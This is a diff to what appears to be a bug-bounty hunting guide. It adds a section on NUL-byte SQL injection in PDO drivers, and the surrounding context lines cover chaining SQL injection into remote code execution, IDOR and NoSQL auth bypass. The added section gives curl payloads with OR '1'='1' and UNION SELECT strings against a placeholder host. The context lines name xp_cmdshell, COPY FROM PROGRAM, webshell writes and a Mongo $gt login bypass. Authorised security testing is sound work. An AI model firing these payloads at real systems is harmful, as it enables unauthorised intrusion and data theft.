@@ -395,6 +395,30 @@ The following real, verified bug-bounty / CVE / coordinated-disclosure cases ext
 
 ## Related Skills & Chains
 
+### Phase X — NUL Byte SQL Injection
+
+Some database drivers (pdo_firebird, older ODBC, legacy C libraries) use `strncat()`/`strcpy()` internally during statement preparation. These functions treat `\0` (NUL byte) as a string terminator. When user input containing `\0` passes through `PDO::quote()` first (correctly escaped), then through `PDO::prepare()` (driver-side tokenizer), the NUL byte truncates the quoted literal, dropping the closing quote and allowing SQL injection. Confirmed on PHP Firebird driver (CVE-2025-14179).
+
+```bash
+# Inject NUL byte to break quoted string boundary
+curl -sk "https://target.com/api/search?q=%00' OR '1'='1' --"
+
+# POST with NUL byte in parameter
+curl -sk -X POST "https://target.com/api/users" \
+  -H "Content-Type: application/json" \
+  -d '{"username":"alice\u0000","department":" UNION SELECT * FROM users--"}'
+
+# URL-encoded NUL byte
+curl -sk "https://target.com/page.php?id=1%00' UNION SELECT 1,2,3--"
+```
+
+Key indicators:
+- Target uses Firebird, PostgreSQL with `PDO::ATTR_EMULATE_PREPARES`, or legacy ODBC
+- Application calls `PDO::quote()` before `PDO::prepare()` (pattern: quote-then-prepare)
+- NUL byte in parameter causes query corruption even when quoting is "correct"
+
+## Related Skills & Chains
+
 - **`hunt-rce`** — A SQLi against a DB user with `FILE`, `xp_cmdshell`, or `COPY FROM PROGRAM` privileges is an RCE primitive, not just a data-read. Chain primitive: MSSQL union-based SQLi → `EXEC xp_cmdshell 'whoami'` → RCE as `NT AUTHORITY\SYSTEM`; Postgres SQLi with `pg_read_server_files` or `COPY ... FROM PROGRAM 'id'` → RCE; MySQL SQLi with `FILE` → write webshell to web-root via `INTO OUTFILE`.
 - **`hunt-idor`** — Once SQLi gives you arbitrary read on the users table, you have the IDs/UUIDs needed to enumerate IDOR endpoints at scale. Chain primitive: blind SQLi extracts `users.uuid` column → feed UUIDs into `/api/users/{uuid}/profile` → confirmed mass IDOR-with-PII rather than a theoretical broken-access-control.
 - **`hunt-nosqli`** — NoSQL injection (MongoDB $regex, $where, $ne) uses a different syntax but the same logic as SQLi. Chain primitive: when SQLi fails on an Express/Mongo stack, switch to `{\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}` — auth bypass through a different DB paradigm entirely.
